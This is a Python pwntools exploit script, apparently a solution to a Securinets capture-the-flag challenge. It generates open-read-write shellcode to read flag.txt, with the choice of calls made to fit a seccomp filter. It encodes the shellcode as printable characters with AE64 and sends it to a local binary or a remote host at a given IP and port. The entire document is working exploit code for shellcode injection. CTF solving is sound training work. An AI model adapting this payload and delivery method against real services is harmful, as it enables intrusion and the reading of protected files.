import sys
sys.path.insert(0, '/tmp/ae64')

from pwn import *
from ae64 import AE64
import time

context.arch = 'amd64'

def get_process():
    if args.REMOTE:
        return remote('48.220.35.76', 1338)
    else:
        return process('./challenge')

# Generate base shellcode for reading the flag using Open-Read-Write
# (Avoiding sendfile as it's not in the seccomp filter)
base_sc = asm(shellcraft.open('flag.txt') + shellcraft.read('rax', 'rsp', 100) + shellcraft.write(1, 'rsp', 100))
info(f"Base shellcode length: {len(base_sc)}")

# Use AE64 to encode the shellcode
# We specifically use R13 as the base register as set in the challenge stub.
obj = AE64()
encoded_sc = obj.encode(base_sc, 'r13')

success(f"Encoded shellcode length: {len(encoded_sc)}")
success(f"Is all printable: {all(32 <= b <= 126 for b in encoded_sc)}")

# Run the exploit
io = get_process()
io.recvuntil(b"> ")
io.send(encoded_sc)

try:
    # Give it a moment to decode and run
    time.sleep(0.5)
    output = io.recvall(timeout=3).decode(errors='ignore')
    print("\n" + "="*40)
    print(output)
    print("="*40 + "\n")
    
    if "Securinets" in output:
        flag_line = [line for line in output.split('\n') if 'Securinets' in line][0]
        success(f"FLAG: {flag_line}")
    else:
        error("No flag found. Check if the exploit ran correctly.")
except Exception as e:
    error(f"Error during flag retrieval: {e}")

io.close()
